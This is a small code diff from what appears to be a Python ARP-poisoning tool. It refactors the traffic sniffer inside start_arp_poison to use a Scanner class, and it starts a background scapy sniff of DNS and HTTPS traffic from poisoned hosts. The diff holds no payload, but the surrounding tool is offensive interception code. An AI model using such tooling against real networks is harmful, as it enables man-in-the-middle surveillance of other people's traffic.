@@ -86,14 +86,15 @@ def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac,
 
     #Traffic Sniffer
     if not dos:
-        from scanner import process_packet
+        from scanner import Scanner
+        scanner = Scanner()
         try:
             my_ip = get_ip()
             my_filter = f"not host {my_ip} and (udp port 53 or tcp port 443)"
         except Exception:
             my_filter = "(udp port 53 or tcp port 443)"
 
-        sniff_thread = threading.Thread(target=lambda: sniff(prn=process_packet, filter=my_filter, store=0), daemon=True)
+        sniff_thread = threading.Thread(target=lambda: sniff(prn=scanner.process_packet, filter=my_filter, store=0), daemon=True)
         threads.append(sniff_thread)
 
     for thread in threads:
